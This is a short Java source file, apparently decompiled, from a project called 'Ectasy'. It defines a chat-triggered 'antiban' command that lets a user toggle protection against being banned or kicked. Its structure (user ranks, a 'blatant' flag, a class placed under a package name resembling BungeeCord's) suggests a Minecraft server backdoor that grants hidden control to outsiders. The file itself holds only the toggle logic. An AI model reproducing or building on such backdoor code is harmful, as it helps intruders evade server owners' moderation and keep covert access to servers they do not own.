package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "antiban",
   description = "Turns off/on anti ban/kick (Default: On)",
   blatant = false,
   rank = Rank.FREE,
   aliases = {"toggleantiban"}
)
public class AntiBanCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      User var4 = Ectasy.users.get(var1.getPlayer().getName());
      var4.antiBan = !var4.antiBan;
      ChatUtil.sendChat(var4.player, "AntiBan mode has been " + (var4.antiBan ? "&aenabled" : "&cdisabled"));
   }
}
